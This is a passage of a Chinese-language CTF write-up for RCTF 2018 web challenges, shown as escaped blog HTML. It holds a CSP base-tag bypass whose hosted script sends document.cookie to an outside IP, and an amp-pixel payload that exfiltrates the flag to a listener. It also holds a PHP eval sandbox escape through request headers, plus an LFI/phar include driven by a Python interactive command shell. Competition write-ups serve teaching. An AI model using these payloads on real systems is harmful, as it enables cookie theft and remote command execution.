class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">\t&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class=\"line\">\t&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;</span><br><span class=\"line\">\t&lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/bootstrap.min.css&quot;&gt;</span><br><span class=\"line\">\t&lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/style.css&quot;&gt;</span><br><span class=\"line\">\t&lt;link href=&quot;https://fonts.googleapis.com/css?family=Titillium+Web&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">\t&lt;title&gt;rBlog 2018&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div class=&quot;container mt-5&quot;&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;card&quot;&gt;</span><br><span class=\"line\">\t\t\t\t&lt;div class=&quot;card-body&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;h2 class=&quot;card-title&quot;&gt;&lt;&gt;1&lt;/h2&gt;</span><br><span class=\"line\">\t\t\t&lt;p class=&quot;card-text&quot;&gt;&amp;lt;&amp;gt;2&lt;/p&gt;</span><br><span class=\"line\">\t\t&lt;/div&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;script nonce=&quot;090c154a21d0fdf5809aff4586fe1eed&quot; src=&quot;/assets/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>title没有过滤，content过滤。</p>\n<p>csp如下:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">X-Frame-Options: DENY</span><br><span class=\"line\">Content-Security-Policy: default-src &apos;none&apos;; script-src &apos;nonce-3ae08923a2654e27a3734f7876a5abe0&apos;; frame-src https://www.google.com/recaptcha/; style-src &apos;self&apos; &apos;unsafe-inline&apos; fonts.googleapis.com; font-src fonts.gstatic.com; img-src &apos;self&apos;</span><br></pre></td></tr></table></figure>\n<p>我们看到jquery.min.js是相对地址，并且base-uri没有在csp中指定。</p>\n<p>所以payload如下:</p>\n<p>title: <code>&lt;base href =&quot;http://【my_server】/&quot;&gt;</code></p>\n<p>content: 随意</p>\n<p>在字节的vps上添加jquery.min.js，网址:           <code>http://[my_server]/assets/js/jquery.min.js</code></p>\n<p>jquery.min.js的内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">window.location.href=&quot;http://123.207.90.143?&quot;+document.cookie;</span><br></pre></td></tr></table></figure>\n<p>最终结果:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">115.159.200.107 - - [22/May/2018:21:39:02 +0800] &quot;GET /?flag=RCTF&#123;why_the_heck_no_mimetype_for_webp_in_apache2_in_8012&#125;;%20hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d HTTP/1.1&quot; 200 15 &quot;http://rblog.2018.teamrois.cn/&quot; &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/66.0.3359.181 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"amp\"><a href=\"#amp\" class=\"headerlink\" title=\"amp\"></a>amp</h2><p>payload:</p>\n<blockquote>\n<p><a href=\"http://amp.2018.teamrois.cn?name=\" target=\"_blank\" rel=\"noopener\">http://amp.2018.teamrois.cn?name=</a><amp-pixel src=\"https://123.207.90.143:1234/pixel?clientId=CLIENT_ID(FLAG)\"></amp-pixel></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM_89_224_redhat ~]# nc -lvv 1234</span><br><span class=\"line\">Ncat: Version 6.40 ( http://nmap.org/ncat )</span><br><span class=\"line\">Ncat: Listening on :::1234</span><br><span class=\"line\">Ncat: Listening on 0.0.0.0:1234</span><br><span class=\"line\">Ncat: Connection from 106.120.206.166.</span><br><span class=\"line\">Ncat: Connection from 106.120.206.166:64053.</span><br><span class=\"line\">\u0016\u0003\u0001\u0002\u0001\u0001�\u0003\u0003�Y���8۲Y�=����6���km����</span><br><span class=\"line\">                                 ��A It+z���^�vY�$���,�\u00183�&apos;�����*K�Zp&quot;jj\u0013\u0001\u0013\u0002\u0013\u0003�+�/�,�0̨̩�\u0013�\u0014��/5</span><br><span class=\"line\">\u0014\u0012\u0004\u0004\u0004\u0001\u0006\u0006\u0001\u0002\u0001\u0001\u0012\u0010</span><br><span class=\"line\">              \u0002hhttp/1.1uP</span><br><span class=\"line\">                          \u0002\u00013+)jj\u0001\u001d �ZaV&gt;WB�~\u0013���|�Z��4KM�������Et~-\u0002\u0001\u0001+</span><br><span class=\"line\"></span><br><span class=\"line\">��\u0017\u0003\u0003\u0003\u0002\u0003\u0001</span><br></pre></td></tr></table></figure>\n<p>writeup:</p>\n<blockquote>\n<p> <a href=\"https://github.com/zsxsoft/my-rctf-2018/tree/master/amp\" target=\"_blank\" rel=\"noopener\">https://github.com/zsxsoft/my-rctf-2018/tree/master/amp</a></p>\n</blockquote>\n<p>注意，我这里是乱码的原因是，我直接监听1234端口，并不支持ssl。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1>","more":"<p>赛后总结</p>\n<h2 id=\"r-cursive\"><a href=\"#r-cursive\" class=\"headerlink\" title=\"r-cursive\"></a>r-cursive</h2><p>源代码:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$token = sha1($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class=\"line\">$dir = &apos;../sandbox/&apos;.$token.&apos;/&apos;;</span><br><span class=\"line\">is_dir($dir) ?: mkdir($dir);</span><br><span class=\"line\">is_file($dir.&apos;index.php&apos;) ?: file_put_contents($dir.&apos;index.php&apos;, str_replace(&apos;#SHA1#&apos;, $token, file_get_contents(&apos;./template&apos;)));</span><br><span class=\"line\">switch($_GET[&apos;action&apos;] ?: &apos;&apos;)&#123;</span><br><span class=\"line\">    case &apos;go&apos;:</span><br><span class=\"line\">        header(&apos;Location: http://&apos;.$token.&apos;.sandbox.r-cursive.ml:1337/&apos;);</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    case &apos;reset&apos;:</span><br><span class=\"line\">        system(&apos;rm -rf &apos;.$dir);</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    default:</span><br><span class=\"line\">        show_source(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;style&gt;code&#123;font-family: Segoe Script, Brush Script MT, cursive; font-size: 1.337em;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p>template:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">sha1($_SERVER[&apos;REMOTE_ADDR&apos;]) === &apos;#SHA1#&apos; ?: die();</span><br><span class=\"line\">&apos;;&apos; === preg_replace(&apos;/[^\\W_]+\\((?R)?\\)/&apos;, NULL, $_GET[&apos;cmd&apos;]) ? eval($_GET[&apos;cmd&apos;]) : show_source(__FILE__);</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/\" target=\"_blank\" rel=\"noopener\">http://589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml:1337/</a>:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">sha1($_SERVER[&apos;REMOTE_ADDR&apos;]) === &apos;589bf872527b686d94b4448c8ea3aed4761eaddc&apos; ?: die();</span><br><span class=\"line\">&apos;;&apos; === preg_replace(&apos;/[^\\W_]+\\((?R)?\\)/&apos;, NULL, $_GET[&apos;cmd&apos;]) ? eval($_GET[&apos;cmd&apos;]) : show_source(__FILE__);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?cmd=print(readdir(opendir(getcwd()))); 可以列目录</span><br><span class=\"line\">?cmd=print(readfile(readdir(opendir(getcwd())))); 读文件</span><br><span class=\"line\">?cmd=print(dirname(dirname(getcwd()))); print出/var/www</span><br></pre></td></tr></table></figure>\n<p>翻阅文档找到<code>getallheaders()</code>函数，会返回所有的http请求头，因为header可控，所以可执行任意命令了<br>?cmd=print(end(getallheaders()));</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /?cmd=eval(implode(getallheaders())); HTTP/1.1</span><br><span class=\"line\">Host: 589bf872527b686d94b4448c8ea3aed4761eaddc.sandbox.r-cursive.ml</span><br><span class=\"line\">cmd: phpinfo(); //</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/rctf/1526973311681.png\" alt=\"1526973311681\"></p>\n<p>这里是利用auto_prepend来载入sandbox下的init.php来设置沙盒的open_basedir。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You can use auto_prepend option in php.ini to supply script that will be executed first. There you can setup open_basedir via ini_set() function based on contents of $_SERVER array.</span><br><span class=\"line\">answered May 10 &apos;13 at 17:21</span><br><span class=\"line\">gmsalex</span><br><span class=\"line\">20816</span><br><span class=\"line\">Yeah, something like this could do it: ini_set(&apos;open_basedir&apos;,&quot;/var/www/hosts/$hostname/:/tmp/&quot;); – Sunry Feb 9 at 1:29</span><br></pre></td></tr></table></figure>\n<p>不修改host:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /?cmd=eval(end(getallheaders())); HTTP/1.1</span><br><span class=\"line\">Host: 71aabdeb3d708872c6e00e066ae48b2669834df7.sandbox.r-cursive.ml:1337</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">cookie: echo ini_get(&apos;open_basedir&apos;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Tue, 22 May 2018 07:25:09 GMT</span><br><span class=\"line\">Server: Apache/2.4.10 (Debian)</span><br><span class=\"line\">X-Powered-By: PHP/5.6.36</span><br><span class=\"line\">Content-Length: 64</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8</span><br><span class=\"line\"></span><br><span class=\"line\">/var/www/sandbox/71aabdeb3d708872c6e00e066ae48b2669834df7/:/tmp/</span><br></pre></td></tr></table></figure>\n<p>修改host:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /?cmd=eval(end(getallheaders())); HTTP/1.1</span><br><span class=\"line\">Host: .sandbox.r-cursive.ml:1337</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">cookie: echo ini_get(&apos;open_basedir&apos;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 403 Forbidden</span><br><span class=\"line\">Date: Tue, 22 May 2018 07:25:36 GMT</span><br><span class=\"line\">Server: Apache/2.4.10 (Debian)</span><br><span class=\"line\">Content-Length: 298</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/html; charset=iso-8859-1</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class=\"line\">&lt;html&gt;&lt;head&gt;</span><br><span class=\"line\">&lt;title&gt;403 Forbidden&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;&lt;body&gt;</span><br><span class=\"line\">&lt;h1&gt;Forbidden&lt;/h1&gt;</span><br><span class=\"line\">&lt;p&gt;You don&apos;t have permission to access /</span><br><span class=\"line\">on this server.&lt;br /&gt;</span><br><span class=\"line\">&lt;/p&gt;</span><br><span class=\"line\">&lt;hr&gt;</span><br><span class=\"line\">&lt;address&gt;Apache/2.4.10 (Debian) Server at .sandbox.r-cursive.ml Port 1337&lt;/address&gt;</span><br><span class=\"line\">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>报错，403，这是由于sandbox目录下只有init.php，没有index.php的缘故。我们访问init.php试试，200,没有报错。说明open_basedir已经发生变化。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /init.php?cmd=eval(end(getallheaders())); HTTP/1.1</span><br><span class=\"line\">Host: .sandbox.r-cursive.ml:1337</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">cookie: echo ini_get(&apos;open_basedir&apos;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Tue, 22 May 2018 07:26:20 GMT</span><br><span class=\"line\">Server: Apache/2.4.10 (Debian)</span><br><span class=\"line\">X-Powered-By: PHP/5.6.36</span><br><span class=\"line\">Content-Length: 0</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>\n<p>getflag:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /71aabdeb3d708872c6e00e066ae48b2669834df7/index.php?cmd=eval(end(getallheaders())); HTTP/1.1</span><br><span class=\"line\">Host: .sandbox.r-cursive.ml:1337</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">cookie: echo ini_get(&apos;open_basedir&apos;);var_dump(file_get_contents(&quot;/var/www/sandbox/init.php&quot;));</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Tue, 22 May 2018 06:51:10 GMT</span><br><span class=\"line\">Server: Apache/2.4.10 (Debian)</span><br><span class=\"line\">X-Powered-By: PHP/5.6.36</span><br><span class=\"line\">Vary: Accept-Encoding</span><br><span class=\"line\">Content-Length: 186</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8</span><br><span class=\"line\"></span><br><span class=\"line\">/var/www/sandbox/:/tmp/string(148) &quot;&lt;?php</span><br><span class=\"line\">    ini_set(&quot;open_basedir&quot;, $_SERVER[&apos;DOCUMENT_ROOT&apos;].&quot;/:/tmp/&quot;);</span><br><span class=\"line\">    // flag: RCTF&#123;apache_mod_vhost_alias_should_be_configured_correctly&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Backdoor\"><a href=\"#Backdoor\" class=\"headerlink\" title=\"Backdoor\"></a>Backdoor</h2><p><img src=\"/images/rctf/1526992722365.png\" alt=\"1526992722365\"></p>\n<p>根据contrab.sh,我们可以得到两个链接：</p>\n<blockquote>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=upload\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=upload</a></p>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=debugging&amp;count=$debuggers</a></p>\n</blockquote>\n<p>打开首页，查看源码，得到aaencode之后的js代码:</p>\n<p>解密网址:<code>https://tool.zcmzcm.org/aadecode</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.loginform.onsubmit = function (e) &#123; </span><br><span class=\"line\">\te.preventDefault()</span><br><span class=\"line\">\tdocument.getElementById(&apos;wp-submit&apos;).disabled = &apos;disabled&apos;</span><br><span class=\"line\">\tsetTimeout(function () &#123;</span><br><span class=\"line\">\t\tdocument.getElementById(&apos;wp-submit&apos;).removeAttribute(&apos;disabled&apos;)</span><br><span class=\"line\">\t\talert(&apos;Login failed&apos;)</span><br><span class=\"line\">\t\t&quot;What? Need hint?&quot;</span><br><span class=\"line\">\t\t&quot;index.php is a hint!&quot;</span><br><span class=\"line\">\t&#125;, 3000)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>说明，不用登录。</p>\n<p>查看post.php，发现可能存在LFI。</p>\n<p>index.php,没啥用</p>\n<blockquote>\n<p><a href=\"http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index\" target=\"_blank\" rel=\"noopener\">http://backdoor.2018.teamrois.cn/post.php?action=php://filter/read=convert.base64-encode/resource=index</a></p>\n</blockquote>\n<p>post.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">include $_GET[&apos;action&apos;] . &apos;.php&apos;;</span><br></pre></td></tr></table></figure>\n<p>uploa.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if (!isset($_FILES[&apos;file&apos;])) exit;</span><br><span class=\"line\">$file = $_FILES[&apos;file&apos;];</span><br><span class=\"line\">$zip = new ZipArchive();</span><br><span class=\"line\">if (true !== $zip-&gt;open($file[&apos;tmp_name&apos;])) &#123;</span><br><span class=\"line\">\techo &apos;No a valid zip&apos;;</span><br><span class=\"line\">\texit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if (false === $zip-&gt;getFromName(&apos;tmp/random.txt&apos;)) &#123;</span><br><span class=\"line\">\techo &apos;No file&apos;;</span><br><span class=\"line\">\texit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$dest = &apos;uploads/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]) . hash(&apos;sha256&apos;, file_get_contents($file[&apos;tmp_name&apos;])) . &apos;.zip&apos;;</span><br><span class=\"line\">move_uploaded_file($file[&apos;tmp_name&apos;], $dest);</span><br><span class=\"line\">echo &apos;Saved into &apos; . $dest;</span><br></pre></td></tr></table></figure>\n<p>利用zip://或者phar://包含。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">s = <span class=\"string\">\"Saved into \"</span></span><br><span class=\"line\">post_url = <span class=\"string\">\"http://backdoor.2018.teamrois.cn/post.php?action=upload\"</span></span><br><span class=\"line\">zip_file = open(<span class=\"string\">\"tmp.zip\"</span>,<span class=\"string\">\"rb\"</span>)</span><br><span class=\"line\">upload_file = &#123;<span class=\"string\">'file'</span>:zip_file&#125;</span><br><span class=\"line\">r = requests.post(post_url,files=upload_file)</span><br><span class=\"line\">dest = r.text[len(s):]</span><br><span class=\"line\">shell_url = <span class=\"string\">\"http://backdoor.2018.teamrois.cn/post.php?action=phar://\"</span>+ dest + <span class=\"string\">\"/evil\"</span></span><br><span class=\"line\">print(<span class=\"string\">\"[*] shell url: \"</span> + shell_url)</span><br><span class=\"line\"><span class=\"keyword\">while</span>  <span class=\"keyword\">True</span>:</span><br><span class=\"line\">    command = input(<span class=\"string\">\"command: \"</span>)</span><br><span class=\"line\">    payload = &#123;<span class=\"string\">'chybeta'</span>: <span class=\"string\">'system(\"%s\");'</span> % command&#125;</span><br><span class=\"line\">    r = requests.get(shell_url,params=payload)</span><br><span class=\"line\">    print(r.text)</span><br></pre></td></tr></table></figure>\n<h2 id=\"r-blog\"><a href=\"#r-blog\" class=\"headerlink\" title=\"r-blog\"></a>r-blog</h2><p>title:        “&lt;&gt;1”</p>\n<p>content: “&lt;&gt;1”</p>\n<p>结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;en&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">\t&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class=\"line\">\t&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, 